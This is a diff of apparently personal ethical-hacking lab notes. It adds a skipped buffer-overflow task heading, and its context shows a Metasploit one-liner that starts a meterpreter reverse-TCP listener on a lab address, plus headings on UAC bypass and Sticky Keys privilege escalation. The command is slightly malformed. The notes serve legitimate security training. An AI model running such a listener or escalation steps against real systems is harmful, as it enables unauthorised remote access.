@@ -307,7 +307,8 @@ x Personal Monitor is used for remote monitoring on a computer that includes rec
 3. We will start a listener using Reverse Shell Generator
 	- `` msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.1.13; set port 4444; exploit "exploit"/meterp``
 
-
+## Task 3: Perform Buffer Overflow Attack to Gain Access to a Remote System
+- skipped 
 # Lab 2: Perform Privilege Escalation to Gain Higher Privileges
 
 ## Task 1: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
